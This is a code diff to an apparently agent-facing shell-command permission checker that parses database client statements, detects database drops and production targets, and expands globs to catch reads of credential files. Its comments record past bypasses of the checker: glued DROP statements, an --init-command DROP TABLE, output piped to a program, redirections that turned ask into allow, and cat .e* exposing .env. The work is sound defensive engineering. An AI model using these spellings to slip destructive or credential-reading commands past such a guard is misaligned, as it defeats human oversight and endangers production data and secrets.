-      out.opaque.push(`the option ${w.text.split('=')[0]} names a program, a script, a configuration or a file`);
+      const written = w.text.slice(2, eq < 0 ? undefined : eq);
+      const known = clickhouseLongName(written);
+      // EVERY statement is read - the client runs them in turn - whichever option spelling carried it: `--query 'show
+      // tables' -q 'drop table t'` is two statements, and the read exception needs both of them to be reads
+      if (known.statement) {
+        if (eq >= 0) statement({ text: w.text.slice(eq + 1), quoted: w.quoted, expands: w.expands });
+        else if (args[i + 1] !== undefined) statement(args[++i]!);
+      }
+      if (known.file || CLICKHOUSE_REACHING_OPTION.test(written.replace(/_/g, '-'))) reaches(w);
+      continue;
+    }
+    // a cluster of short options: `-q` takes the rest of the word, or the next word, as its value; a letter this reader
+    // does not know ends the cluster, because it may take the rest of the word as its own value (`-hprod-queries`)
+    for (let k = 1; k < w.text.length; k++) {
+      const c = w.text[k]!;
+      if (c === 'q') {
+        const glued = w.text.slice(k + 1).replace(/^=/, '');
+        if (glued !== '') statement({ text: glued, quoted: w.quoted, expands: w.expands });
+        else if (args[i + 1] !== undefined) statement(args[++i]!);
+        break;
+      }
+      if (c === 'C') {
+        reaches(w);
+        break;
+      }
+      if (!CLICKHOUSE_SHORT_FLAGS.includes(c)) break;
+    }
+  }
+  return out;
+}
+
+// --- cqlsh / influx ------------------------------------------------------------------------------------------------
+// Two clients whose business here is the statements they are handed. Their option sets are not modelled closed, so an
+// option this reader does not know is ignored rather than asked about; what it reads is every spelling of the statement
+// option, and the options that hand the client a file to run.
+const CQLSH_OPTIONS: DbOptionSpec = {
+  value: [
+    'execute', 'file', 'keyspace', 'username', 'password', 'cqlshrc', 'credentials', 'browser', 'encoding', 'connect-timeout',
+    'request-timeout', 'protocol-version', 'cqlversion', 'secure-connect-bundle', 'consistency-level', 'serial-consistency-level',
+  ],
+  flag: ['color', 'no-color', 'ssl', 'tty', 'debug', 'coverage', 'no-file-io', 'disable-history', 'version', 'help'],
+  shortValue: 'efukbp',
+  shortFlag: 'Ctvh',
+  abbreviate: true,
+  alias: { e: 'execute', f: 'file', u: 'username', p: 'password', k: 'keyspace', b: 'secure-connect-bundle' },
+};
+function cqlshEscape(args: readonly DbWord[]): DbEscape {
+  const out: DbEscape = newDbEscape();
+  const parsed = parseDbArgs(args, CQLSH_OPTIONS);
+  for (const o of parsed.options) {
+    if (o.value === null) continue;
+    if (o.name === 'execute') {
+      out.statements.push(o.value.text);
+      if (o.value.expands) out.opaque.push('the statement is built at run time, so the text the client runs is not the text on the command line');
+    } else if (o.name === 'file') out.opaque.push('-f names a script the client runs');
+  }
+  return out;
+}
+const INFLUX_OPTIONS: DbOptionSpec = {
+  value: ['execute', 'import', 'path', 'host', 'port', 'username', 'password', 'database', 'format', 'precision', 'pps', 'type'],
+  flag: ['ssl', 'unsafeSsl', 'compressed', 'pretty', 'version', 'help'],
+  shortValue: '',
+  shortFlag: '',
+  singleDash: true,
+};
+function influxEscape(args: readonly DbWord[]): DbEscape {
+  const out: DbEscape = newDbEscape();
+  const parsed = parseDbArgs(args, INFLUX_OPTIONS);
+  for (const o of parsed.options) {
+    if (o.name === 'import') out.opaque.push('-import loads a file of statements and points');
+    else if (o.name === 'execute' && o.value !== null) {
+      out.statements.push(o.value.text);
+      if (o.value.expands) out.opaque.push('the statement is built at run time, so the text the client runs is not the text on the command line');
+    }
   }
   return out;
 }
@@ -11247,6 +11515,45 @@ function dbWordsOf(
   return commandWords(tokenizeMarked(normalized)).map((w) => ({ text: w.text, quoted: w.quoted, expands: /[$`]/.test(w.text) }));
 }
 
+/** ONE READER OF "WHAT SQL WILL THIS CLIENT RUN", for every question that asks it: whether a production invocation is a read
+ *  (`resolveDbTarget`), whether a statement drops a database (`dbDropsDatabase`, below), what to set aside from the
+ *  redirection test (`classifyShellPaths`). The segment is read AS WRITTEN - a statement is one quoted word there - and
+ *  the client's own grammar says which of its options carry a statement, in every spelling it accepts: the long name and
+ *  its abbreviations, the short letter, the value glued to either, the option given twice. The statements are the UNION of
+ *  all of them. Each question used to keep its own scan of the line, and they disagreed in the direction that released the
+ *  act: a second statement given by clickhouse's `-q` was not read once `--query` had given a read (sa10-34), and mysql's
+ *  `-e'DROP DATABASE app'` hid its words from a matcher that wanted a word boundary (r11-84). */
+function dbStatements(
+  client: string,
+  raw: ReadonlyArray<{ text: string; quoted: boolean; expands?: boolean }>,
+  normalized: string,
+): DbEscape {
+  return dbClientEscape(client, dbWordsOf(client, raw, normalized));
+}
+
+/** The objects whose DROP is "drop a database" (`db.local.drop`): a database, a schema (MySQL's synonym for one, and in
+ *  PostgreSQL everything the database holds) and a keyspace (Cassandra's). A table, an index or a view is DDL on the
+ *  database's own contents (`db.local.schema`) and stays ordinary work. One list, read by the statement reader below and
+ *  mirrored by the `db.local.drop` matcher for the forms that carry their statement outside an option (a here-string). */
+const DB_DROPPED_OBJECTS: ReadonlySet<string> = new Set(['database', 'schema', 'keyspace']);
+
+/** Whether any of the statements a client will run drops a database. String literals are blanked first (`select 'drop
+ *  database x'` drops nothing), and a statement the scan refuses (a comment can hide the words from this reader and not from
+ *  the engine) is not judged here - the client's escape reader has already made it opaque, which asks as well. */
+function dbDropsDatabase(client: string, statements: readonly string[]): boolean {
+  // the dialect the CLIENT reads: a `#` or a backslash means something else to PostgreSQL than to MySQL
+  const dialect: SqlDialect = client === 'psql' ? 'pg' : 'mysql';
+  for (const text of statements) {
+    const scan = sqlScan(text, dialect);
+    if ('refused' in scan) continue;
+    for (const chunk of scan.code.toLowerCase().split(';')) {
+      const words = chunk.trim().split(/\s+/);
+      if (words[0] === 'drop' && DB_DROPPED_OBJECTS.has(words[1] ?? '')) return true;
+    }
+  }
+  return false;
+}
+
 /** The reader. `client` is the head the caller classified; `words` are the segment's words as the shell delivers them. */
 function dbClientEscape(client: string, words: readonly DbWord[]): DbEscape {
   const at = words.findIndex((w) => w.text.replace(/^.*\//, '') === client);
@@ -11260,6 +11567,8 @@ function dbClientEscape(client: string, words: readonly DbWord[]): DbEscape {
   if (client === 'clickhouse-client') return clickhouseEscape(args);
   // `clickhouse client` and `clickhouse local` are the two-word spellings; its other subcommands run no query
   if (client === 'clickhouse' && /^(client|local)$/.test(args[0]?.text ?? '')) return clickhouseEscape(args.slice(1));
+  if (client === 'cqlsh') return cqlshEscape(args);
+  if (client === 'influx') return influxEscape(args);
   return newDbEscape();
 }
 
@@ -11299,39 +11608,36 @@ function resolveDbTarget(
   // inspects a plan, and refusing it absolutely leaves no way to look (exit review 9). The statement must be
   // wholly read-only — one write clause anywhere in it and the whole thing acts.
   const line = rawSeg ?? requote(tokens);
-  // read from the RAW segment when there is one: there the statement is still the single quoted word it was
-  // written as, so a `;` inside it is visible and the whole statement can be judged
-  // `-e` IS mysql's SHORT `--execute`, and only `-c` was read as a short statement flag — so every read-only
-  // statement spelled the mysql way was judged as an unrestricted connection (self-attack on exit review 9).
-  // A GO-STYLE SINGLE-DASH LONG OPTION IS NOT A CLUSTER. influx spells it `-execute`, and the short-flag scan read it
-  // as `-e -x -e -c ute` and pulled a statement called `ute` out of it - so the read-only test failed on a
-  // statement the operator never wrote (exit review 10). Written with the double dash the scan cannot misread it.
-  const stmtTokens = (rawSeg === undefined ? tokens : tokenizeMarked(rawSeg).map((t) => t.text)).map((t) =>
-    /^-(execute|eval|query|command|init-command|init-file)(=|$)/.test(t) ? `-${t}` : t,
-  );
+  // THE STATEMENTS ARE THE CLIENT'S OWN GRAMMAR'S ANSWER, read from the RAW segment: there the statement is still the single
+  // quoted word it was written as, so a `;` inside it is visible and the whole statement can be judged. This used to be a
+  // second scan of the line with its own idea of which options carry a statement (`-c`, `-e`, and a list of long names), and
+  // the two readers disagreed about every client whose short option is something else: clickhouse spells it `-q`, so
+  // `--query 'show tables' -q 'drop table t'` was ONE read and a production DROP TABLE at ALLOW (closure audit, sa10-34).
+  // Now there is one: dbStatements asks the client's grammar, which knows every option that carries a statement (and its
+  // abbreviations, its glued forms, its repetitions), and the exception needs ALL of them to be reads.
   // `--init-command` RUNS BEFORE EVERYTHING ELSE, so a read-only `-e` says nothing about what the session does:
   // `mysql -h prod-db --init-command="DROP TABLE users" -e "SHOW TABLES"` drops the table and then lists
-  // (exit review 10). Every statement the client will run is collected, and the exception needs ALL of them to
-  // be read-only.
-  const { statements, fromFile } = dbStatements(stmtTokens);
-  const readOnlyStatement =
-    statements.length > 0 && !fromFile && statements.every((q) => isReadStatement(q));
+  // (exit review 10).
+  const client = head.replace(/^.*\//, '');
+  const probe = isProbeInvocation(line);
+  const reading = probe ? newDbEscape() : dbStatements(client, tokenizeMarked(line), line);
+  const statements = reading.statements;
+  // A SCRIPT THE CLIENT IS HANDED (`psql -f`, `--queries-file`, `source`) is in `opaque`, and a read that carries one is not a
+  // read, so no file-ness needs to be tracked on its own
+  const readOnlyStatement = statements.length > 0 && reading.opaque.length === 0 && statements.every((q) => isReadStatement(q));
   // psql's `-l` LISTS THE DATABASES and connects to run nothing else - and only when it is a FLAG: in `psql -U -l -c
   // 'drop table t'` the `-l` is the user NAME, and a statement anywhere on the line makes the exception moot
   const PSQL_VALUE_SHORT = /^-[cdfFhLoPpRTUv]$/;
   const listsOnly =
     head === 'psql' &&
     statements.length === 0 &&
-    !fromFile &&
     tokens.some((t, i) => (t === '-l' || t === '--list') && !(i > 0 && PSQL_VALUE_SHORT.test(tokens[i - 1] ?? '')));
   const redisRead = /^(redis-cli|valkey-cli)$/.test(head) && redisReadOnly(tokens);
   // A READ THAT CARRIES AN ESCAPE IS NOT A READ. The exception above is a claim about the whole invocation: a plain
   // SELECT whose output is piped to a program, or whose session starts from a script, acts - and against a production
   // host `psql -h prod -c 'select 1' -o '|cmd'` was the allowed read plus an unread program (independent audit, item 5).
-  const client = head.replace(/^.*\//, '');
-  const escapes =
-    !isProbeInvocation(line) && dbClientEscape(client, dbWordsOf(client, tokenizeMarked(line), line)).opaque.length > 0;
-  const executes = escapes || (!isProbeInvocation(line) && !readOnlyStatement && !listsOnly && !redisRead);
+  const escapes = reading.opaque.length > 0;
+  const executes = escapes || (!probe && !readOnlyStatement && !listsOnly && !redisRead);
   // sqlite3 operates on a file: the path rules already govern it
   if (head === 'sqlite3') return { cls: 'LOCAL', target: tokens[1] ?? '(memory)', executes };
   const signals: Array<{ cls: TargetClass; target: string }> = [];
@@ -11360,6 +11666,37 @@ function resolveDbTarget(
     else if (/^(PGURI|REDIS_URL|MONGODB_URI|MONGO_URL|DATABASE_URL|FLYWAY_URL)$/.test(k))
       push(endpointHost(v.replace(/^jdbc:/, '')), `${k}=`);
     else if (k === 'PGSERVICE') signals.push({ cls: 'UNCLASSIFIED', target: `PGSERVICE=${v}` });
+
+  // A VARIABLE (OR AN ENVIRONMENT) THAT A FLAG NAMES IS THE TARGET IT HOLDS. `dbmate --env PROD_URL up` does not connect to
+  // anything called PROD_URL: the flag names the variable that holds the connection string, and `PROD_URL=postgres://u@prod-db/
+  // app dbmate --env PROD_URL up` was the production migration at ALLOW because the only assignments this resolver read
+  // were the ones whose NAMES it had listed (r11-86). A variable whose value is on the command line is followed to it and
+  // read like any URL on the line; one whose value is not is the ambient environment, which nobody here can read, so it asks.
+  // An environment NAME (`knex --env production`) is judged by the name, like a namespace.
+  const namedValues: string[] = [];
+  // ...and a connection string whose VALUE the shell fills in is a target nobody here can read, which is what a target the
+  // line does not name is: `flyway -url="$PROD_URL" migrate` and `liquibase --url=$DB_URL update` were the local socket. (A
+  // variable this line assigned EARLIER was substituted before this reader saw it; one assigned in front of the command is
+  // not the one the shell expands in its arguments - the shell expands them first - so the environment is not asked.)
+  for (const v of optionValues(tokens, '', DB_URL_OPTIONS))
+    if (/[$`]/.test(v)) signals.push({ cls: 'UNCLASSIFIED', target: `a connection string built at run time (${v})` });
+  const toolAt = tokens.findIndex((t, i) => i < 4 && DB_NAMED_TARGET_OPTIONS[t.replace(/^.*\//, '')] !== undefined);
+  if (toolAt >= 0) {
+    const spec = DB_NAMED_TARGET_OPTIONS[tokens[toolAt]!.replace(/^.*\//, '')]!;
+    for (const name of optionValues(tokens.slice(toolAt), spec.short, [...spec.long])) {
+      if (isOpaqueTarget(name)) signals.push({ cls: 'UNCLASSIFIED', target: `${name} (named by an option of ${tokens[toolAt]})` });
+      else if (hasProductionMarker(name, targets.productionMarkers)) signals.push({ cls: 'PRODUCTION', target: `${spec.names} ${name}` });
+      else if (spec.names === 'variable') {
+        const value = envInputs[`\0env:${name}`] ?? envInputs[name];
+        if (value === undefined)
+          signals.push({ cls: 'UNCLASSIFIED', target: `$${name} (named by an option of ${tokens[toolAt]}; its value is not on the command line)` });
+        else if (/^sqlite3?:/i.test(value)) signals.push({ cls: 'LOCAL', target: `$${name} (a sqlite file)` });
+        else if (isOpaqueTarget(value)) signals.push({ cls: 'UNCLASSIFIED', target: `$${name} (its value is built at run time)` });
+        else if (/:\/\//.test(value)) namedValues.push(value);
+        else push(value, `$${name}`);
+      }
+    }
+  }
 
   // `\c [DBNAME [USER [HOST [PORT]]]]` RECONNECTS THE SESSION, so everything after it runs on that host. The
   // host is a WORD INSIDE a `-c` value, not a token of the command line, and only the short `\c - - HOST` form
@@ -11390,7 +11727,8 @@ function resolveDbTarget(
     if (words[2] !== undefined && words[2] !== '-') push(words[2], '\\connect host');
   }
 
-  for (const t of tokens) {
+  // (the connection strings that a flag-named variable holds are read here like any other word of the line)
+  for (const t of [...tokens, ...namedValues]) {
     // a URI anywhere in the token, not only at its start: `-url=jdbc:postgresql://prod-db/app` hid the host
     for (const m of t.matchAll(/[a-z][a-z0-9+.-]*:\/\/(?:[^@/\s]*@)?\[?([^\]:/?\s]+)\]?/gi)) {
       if (isOpaqueTarget(m[0]!)) signals.push({ cls: 'UNCLASSIFIED', target: m[0]! });
@@ -11491,6 +11829,32 @@ function resolveDbTarget(
   if (signals.length === 0) return { cls: 'LOCAL', target: 'the local socket', executes };
   const worst = signals.reduce((a, b) => (TARGET_SEVERITY[b.cls] > TARGET_SEVERITY[a.cls] ? b : a));
   return { cls: worst.cls, target: worst.target, executes };
+}
+
+/** A STATEMENT THAT DROPS A DATABASE IS THE DROP CAPABILITY, however the client was handed it. The `db.local.drop` matcher
+ *  reads the normalized TEXT of the line, and a statement that is glued to its option (`mysql -e'DROP DATABASE app'`) has no
+ *  word boundary in front of `DROP` there, so the drop was the plain `db.local.query` ALLOW (r11-84). The statements are
+ *  read by the client's own grammar (dbStatements), once, for every spelling of every statement option; a client that is
+ *  asked to drop a database by any of them is dropping one. The upgrade only ever raises, and the target resolution that
+ *  follows still decides WHERE (a production host is refused outright, whatever the capability was). */
+function upgradeToDbDrop(
+  table: CompiledAuthorityTable,
+  ctx: EvaluationContext,
+  hit: CapabilityHit,
+  norm: string,
+  rawSeg: string,
+): CapabilityHit {
+  if (hit.capability !== 'db.local.query' || !('db.local.drop' in table.capabilities)) return hit;
+  const client = commandHead(norm);
+  if (!DB_CLIENT_HEADS.has(client)) return hit;
+  if (!dbDropsDatabase(client, dbStatements(client, tokenizeMarked(rawSeg), norm).statements)) return hit;
+  return {
+    ...hit,
+    capability: 'db.local.drop',
+    verdict: verdictFor(table, ctx, 'db.local.drop'),
+    via: `${hit.via}; a statement of the client drops a database`,
+    absolute: isAbsoluteCap(table, 'db.local.drop'),
+  };
 }
 
 /** Re-judges a capability that ASSERTS a local target against the target the command actually names (Q98). */
@@ -11971,6 +12335,10 @@ function parseHttpie(args: string[]): HttpRequest[] {
   return [{ method: offline ? 'GET' : effective, url, body, repointed }];
 }
 
+/** How many carriers inside carriers (`sh -c "sh -c '…'"`) the readers of the segment AS WRITTEN follow. Every one of them says so
+ *  when a nest is deeper than this, instead of ending the walk as if there were nothing below. */
+const CARRIER_NEST = 32;
+
 /** Every invocation of an HTTP client in this segment, read from the segment AS WRITTEN (quoting is what keeps a header
  *  value from being mistaken for a destination) and from the shell bodies it carries. */
 function httpInvocations(raw: string, depth = 0): Array<{ head: string; args: string[] }> {
@@ -11980,7 +12348,11 @@ function httpInvocations(raw: string, depth = 0): Array<{ head: string; args: st
     const k = words.findIndex((w) => !w.quoted && HTTP_CLIENT.test(w.text.replace(/^.*\//, '')));
     if (k >= 0)
       out.push({ head: words[k]!.text.replace(/^.*\//, ''), args: words.slice(k + 1).map((w) => w.text) });
-    if (depth < 4) for (const body of carriedShellBodies(sub)) out.push(...httpInvocations(body, depth + 1));
+    // A NEST DEEPER THAN THE WALK GOES IS NOT A NEST THAT ENDS: what a carrier carries below the cap was never read, so the request it
+    // may hold is one whose destination nobody can resolve - which is what `$URL` is, and what asks
+    for (const body of carriedShellBodies(sub))
+      if (depth < CARRIER_NEST) out.push(...httpInvocations(body, depth + 1));
+      else out.push({ head: 'curl', args: ['$CARRIER_NEST_TOO_DEEP'] });
   }
   return out;
 }
@@ -12103,41 +12475,71 @@ function classifyNormalized(
   norm: string,
   state: EffectState,
 ): CapabilityHit[] {
-  let outer: CapabilityHit | null = null;
   const additive: CapabilityHit[] = [];
-  const subject = forgeApiSubject(ctx, norm, state.env);
-  for (const { m, re } of compiled) {
-    if (re.test(subject)) {
+  // THE MATCHERS READ THE SEGMENT, in the order the control plane lists them, and the first one that matches decides what
+  // the segment IS. It is asked of a TEXT, because one text is not the whole truth about a command that carries redirections:
+  // the matchers that describe a WRITE through a redirection need to see the operator, and the matchers that describe the ACT
+  // need not to (see the second view below).
+  const firstMatch = (text: string, collect: boolean): CapabilityHit | null => {
+    const subject = forgeApiSubject(ctx, text, state.env);
+    for (const { m, re } of compiled) {
+      if (!re.test(subject)) continue;
       // An ADDITIVE matcher describes something the segment ALSO does — a write destination — not what it IS.
       // Letting one win first-match terminated classification of the rest: `git clone --template=evil -o up URL`
       // matched the `--output|-o` write matcher, which sits above the `--template` hook-install deny, and a
       // single `-o` turned DENY into ALLOW while the template's hook really executed (exit review 2).
       if (m.additive) {
-        additive.push({
-          capability: m.capability,
-          verdict: verdictFor(table, ctx, m.capability),
-          via: `matcher /${m.command}/`,
-          segment: norm,
-          absolute: isAbsoluteCap(table, m.capability),
-        });
+        if (collect)
+          additive.push({
+            capability: m.capability,
+            verdict: verdictFor(table, ctx, m.capability),
+            via: `matcher /${m.command}/`,
+            segment: norm,
+            absolute: isAbsoluteCap(table, m.capability),
+          });
         continue;
       }
-      outer = retargetLocalCapability(
+      return retargetLocalCapability(
         table,
         ctx,
-        {
-          capability: m.capability,
-          verdict: verdictFor(table, ctx, m.capability),
-          via: `matcher /${m.command}/`,
-          segment: norm,
-          absolute: isAbsoluteCap(table, m.capability),
-        },
-        norm,
+        upgradeToDbDrop(
+          table,
+          ctx,
+          {
+            capability: m.capability,
+            verdict: verdictFor(table, ctx, m.capability),
+            via: `matcher /${m.command}/`,
+            segment: norm,
+            absolute: isAbsoluteCap(table, m.capability),
+          },
+          text,
+          state.env.rawSegment ?? text,
+        ),
+        text,
         state.env.envInputs,
-        state.env.rawSegment ?? norm,
+        state.env.rawSegment ?? text,
         state.env,
       );
-      break;
+    }
+    return null;
+  };
+  let outer = firstMatch(norm, true);
+  // THE ACT IS READ WITHOUT ITS REDIRECTIONS TOO. `git checkout .` is the matcher `…(\.|\*)\s*$`; the same command followed by
+  // `>/dev/null` - glued or spaced - ends in a redirection, and no matcher that wants the end of the line found it: ASK became
+  // ALLOW for every governed command whose matcher is anchored (r11-7: 23 of ~110 flipped). The redirection is not part of
+  // the act; the path rules judge where it writes and the network rule where it connects. This view can only RAISE the answer:
+  // a matcher of the text WITH the operator (a write into a protected tree) was already asked, and keeps winning when it is
+  // the stricter.
+  if (/[<>]/.test(norm)) {
+    const plain = stripRedirections(norm);
+    if (plain !== norm && plain !== '') {
+      const second = firstMatch(plain, false);
+      const floor = outer ?? { verdict: verdictFor(table, ctx, 'command.unknown'), absolute: false };
+      if (
+        second !== null &&
+        (VERDICT_RANK[second.verdict] > VERDICT_RANK[floor.verdict] || (VERDICT_RANK[second.verdict] === VERDICT_RANK[floor.verdict] && second.absolute && !floor.absolute))
+      )
+        outer = second;
     }
   }
   // A NETWORK TOOL IS JUDGED BY WHAT IT SENDS AND TO WHOM: the name alone made a download and a PUT that merges a pull
@@ -12415,6 +12817,25 @@ function pathTokens(segment: string, cwd: string, old?: readonly string[]): Path
   return out;
 }
 
+/** A line that makes a shell's wildcard match a name that begins with a dot: bash's `shopt -s dotglob` and a GLOBIGNORE (any
+ *  value turns it on), zsh's `setopt glob_dots` in the spellings its option parser accepts (case and underscores are ignored). */
+const DOTGLOB_RE = /dot_?glob|glob_?dots|globignore/i;
+/** `shopt -s nocaseglob` and zsh's `unsetopt CASE_GLOB`: a pattern matches a name whatever its case */
+const NOCASEGLOB_RE = /case_?glob/i;
+/** `shopt -s extglob` and zsh's `setopt EXTENDED_GLOB`: `@(a|b)`, `^x`, `x~y` and `x#` mean something a plain pattern does not */
+const EXTGLOB_RE = /ext_?glob|extended_?glob/i;
+
+/** How the shell that runs a unit matches a wildcard, read from the unit itself. */
+function shellGlobOptions(units: readonly string[]): { dotfiles: boolean; ignoreCase: boolean; extended: boolean } {
+  return {
+    dotfiles: units.some((s) => DOTGLOB_RE.test(s)),
+    ignoreCase: units.some((s) => NOCASEGLOB_RE.test(s)),
+    extended: units.some((s) => EXTGLOB_RE.test(s)),
+  };
+}
+/** a zsh glob qualifier list that carries `D`: this one pattern matches names that begin with a dot */
+const ZSH_DOT_QUALIFIER_RE = /\([A-Za-z0-9^.,:@/*%=+<>-]*D[A-Za-z0-9^.,:@/*%=+<>-]*\)$/;
+
 function globCouldReachCredentials(abs: string): boolean {
   const home = canonicalPath(homedir()).split(sep).join('/');
   const posix = abs.split(sep).join('/');
@@ -12449,6 +12870,8 @@ function classifyShellPaths(
   rawSeg: string = seg,
   /** the directories `~-` and `$OLDPWD` may name here, when the command line has one */
   old?: readonly string[],
+  /** how the shell matches a wildcard on this line: dotfiles, case, extended patterns (see shellGlobOptions) */
+  shellGlob: { dotfiles: boolean; ignoreCase: boolean; extended: boolean } = { dotfiles: false, ignoreCase: false, extended: false },
 ): CapabilityHit[] {
   const hits: CapabilityHit[] = [];
   // operands are read with the redirections taken out (`cp x f 2>&1`: the destination is `f`); the regex tests below keep
@@ -12468,7 +12891,7 @@ function classifyShellPaths(
   // statement that names no directory is not a path; one that does (`/etc/hostname`, `~/.ssh/id_rsa`) is still scanned,
   // beside the reader that knows which server-side functions open a file.
   const rawWords = tokenizeMarked(rawSeg);
-  const dbEscape = DB_CLIENT_HEADS.has(head) ? dbClientEscape(head, dbWordsOf(head, rawWords, seg)) : null;
+  const dbEscape = DB_CLIENT_HEADS.has(head) ? dbStatements(head, rawWords, seg) : null;
   const statementWords = new Set(
     (dbEscape?.statements ?? []).flatMap((s) => tokenize(s)).filter((w) => !w.includes('/')),
   );
@@ -12582,41 +13005,18 @@ function classifyShellPaths(
   // client rather than folded into the shared pattern (exit review 10).
   const redisReadsScript = /^(redis-cli|valkey-cli)$/.test(head) && tokens.some((t) => t === '--eval' || t === '-x');
   // `mysql < file` feeds the client a script; `where a < 1` inside the statement is a comparison. Only a `<` that the
-  // shell sees is the former, so the VALUE of the client's own statement flag is set aside before the test - and
-  // nothing else: the segment may have been re-quoted from tokens (a wrapper stripped), so a quote around a word says
-  // nothing about whether it was a statement. The flag is the client's own (`mysql -c` is `--comments`, and
-  // `redis-cli -e` is a boolean), and a client not named here keeps the text as it is.
-  const STATEMENT_FLAG: Record<string, RegExp> = {
-    psql: /^(-c|--command)$/,
-    mysql: /^(-e|--execute)$/,
-    mariadb: /^(-e|--execute)$/,
-    mysqlsh: /^(-e|--execute)$/,
-    cqlsh: /^(-e|--execute)$/,
-    'clickhouse-client': /^(-q|--query)$/,
-    influx: /^(-execute|--execute)$/,
-    mongosh: /^--eval$/,
-    mongo: /^--eval$/,
-  };
-  const clientAt = rawWords.findIndex((t) => !t.quoted && STATEMENT_FLAG[t.text.replace(/^.*\//, '')] !== undefined);
+  // shell sees is the former, so every statement the client's grammar found is set aside before the test - and nothing
+  // else: the segment may have been re-quoted from tokens (a wrapper stripped), so a quote around a word says nothing about
+  // whether it was a statement. THE STATEMENTS ARE THE READER'S (dbStatements), not a table of which flag carries one
+  // that this site kept for itself: that table knew `-q` for clickhouse and not `-e'…'` glued, and it was the second scan
+  // of the same dimension (closure audit, RC-DB). A statement is set aside whether it stands alone (`-e`'s next word),
+  // is glued to its option (`-eSQL`) or follows an `=` (`--execute=SQL`).
   let unquotedSeg = seg;
-  let unquotedWords = rawWords.map((w) => w.text);
-  if (clientAt >= 0) {
-    const flag = STATEMENT_FLAG[rawWords[clientAt]!.text.replace(/^.*\//, '')]!;
-    const kept: string[] = [];
-    for (let n = 0; n < rawWords.length; n++) {
-      const w = rawWords[n]!.text;
-      if (n > clientAt && /^--?[a-z-]+=/.test(w) && flag.test(w.slice(0, w.indexOf('=')))) continue;
-      kept.push(w);
-      if (n > clientAt && flag.test(w) && rawWords[n + 1] !== undefined) n++;
-    }
-    unquotedSeg = kept.join(' ');
-    unquotedWords = kept;
-  }
-  // THE CLIENT'S OTHER CHANNELS - a program, a file it writes, native code - are read by ONE grammar (dbClientEscape)
-  // rather than found by their spelling. A statement the reader recognised is set aside from the redirection test
-  // below, for the same reason a statement flag's value is: `where id < 10` is a comparison, not `< file`.
   if (dbEscape !== null && dbEscape.statements.length > 0)
-    unquotedSeg = unquotedWords.filter((w) => !dbEscape.statements.some((st) => w === st || w.endsWith(`=${st}`))).join(' ');
+    unquotedSeg = rawWords
+      .map((w) => w.text)
+      .filter((w) => !dbEscape.statements.some((st) => w === st || (w.startsWith('-') && w.length > st.length && w.endsWith(st))))
+      .join(' ');
   // A FILE THE CLIENT WRITES IS JUDGED AS A WRITE, NOT TAKEN FOR A PROGRAM IT RUNS. The modelled clients report theirs
   // (`DbEscape.writes`); the dump tools have no grammar and their output option is read here. The redirection targets
   // are the shell's, and are read with the quoting still on the line.
@@ -13370,9 +13770,14 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
   // ...and the words of a command a CARRIER hands to a shell (`sh -c 'cp x "sp l/f"'`, `trap`, a herestring) are the carried
   // text's own: the carrier's quoting hid them one level up, exactly as normalization does
   const carriedTexts = new Set<string>();
+  let nestTooDeep = false;
   const wordsAsWritten = (text: string, depth = 0): string[] => {
     const words = tokenize(text);
-    if (depth >= 4) return words;
+    if (depth >= CARRIER_NEST) {
+      // a carrier below the cap was not read: the words it holds are unproved, not absent
+      if (carriedShellBodies(text).length > 0) nestTooDeep = true;
+      return words;
+    }
     for (const body of carriedShellBodies(text)) {
       carriedTexts.add(body);
       // (a loop, not a spread: a carried script of a hundred thousand words is more arguments than a call can take)
@@ -13401,7 +13806,44 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
       wholeWords.add(value);
       if (!paths.some((p) => p.raw === value)) paths.push(...pathEntries(cwd, value, old));
     }
-  if (containerPaths || paths.length === 0) return hits;
+  if (nestTooDeep)
+    hits.push({
+      capability: 'command.unknown',
+      verdict: verdictFor(table, ctx, 'command.unknown'),
+      via: `shell carriers nested deeper than ${CARRIER_NEST} levels: the words below were not read`,
+      segment: seg,
+      absolute: false,
+    });
+  if (containerPaths) return hits;
+  const expandedGlobs = new Set<string>();
+  const judgeGlob = (raw: string): void => {
+    if (expandedGlobs.has(raw)) return;
+    expandedGlobs.add(raw);
+    const set = globMatches(cwd, raw, old, shellGlob);
+    if (set.bounded)
+      hits.push({
+        capability: 'command.unknown',
+        verdict: verdictFor(table, ctx, 'command.unknown'),
+        via: `glob ${raw} matches more names than this kernel enumerates, so a credential file may be among them`,
+        segment: seg,
+        absolute: false,
+      });
+    for (const m of set.paths)
+      for (const probe of set.directories.has(m) ? [m, `${m}/`] : [m]) {
+        const g = classifyPath(table, ctx, 'Read', probe);
+        if (g.via.startsWith('matcher path') || g.capability.startsWith('fs.credential')) {
+          hits.push({ ...g, via: `glob ${raw} matches ${m} (${g.via})`, segment: seg });
+          break;
+        }
+      }
+  };
+  // A BARE WILDCARD (`*`, `?*`, `*(D)`) IS NOT A PATH-SHAPED WORD, and no word of the loop below is judged unless it is - but with
+  // `dotglob`/`GLOB_DOTS` on, or a zsh `(D)` qualifier, it matches `.env` as surely as `.e*` does
+  for (const t of tokens.slice(1)) {
+    const v = pathValueOf(t);
+    if (v && /[*?[]/.test(v) && !isPathLike(v) && (shellGlob.dotfiles || ZSH_DOT_QUALIFIER_RE.test(v)) && !patternWords.includes(v)) judgeGlob(v);
+  }
+  if (paths.length === 0) return hits;
   for (const p of paths) {
     if (p.abs === null) {
       hits.push({
@@ -13479,6 +13921,12 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
           segment: seg,
           absolute: false,
         });
+      // A WILDCARD DENOTES THE NAMES THAT EXIST AND MATCH IT, so that is what it is judged by: the directory is read, the
+      // segment matched, and every match classified like the path it is. Judged by its literal prefix, `cat .e*` was a read
+      // of `.e` - a name that does not exist - and printed `.env` at ALLOW (r11-95), as did `.??*`, `.e?v` and the rest of
+      // the spellings that match a name without spelling it. A name that begins with a dot is matched only by a pattern that
+      // begins with one, unless the line turns that off (DOTGLOB_RE). The expansion is bounded; a reached bound is a question.
+      if (p.glob) judgeGlob(p.raw);
       if (recursive && (posix === home || home.startsWith(posix + '/') || posix === '/'))
         hits.push({
           capability: 'fs.credential-store.read',
@@ -13674,6 +14122,10 @@ function runDirectory(seg: string, base: string): { dir: string; known: boolean 
     // the chain is read by the one carrier reader: every `env` in it, with its own options in whatever spelling, and the
     // `git` the chain ends in. A directory option that is spelled in a way nobody can place leaves the directory UNKNOWN
     const peeled = peelCarriers(ws, 0, { prefixes: HEAD_PREFIXES });
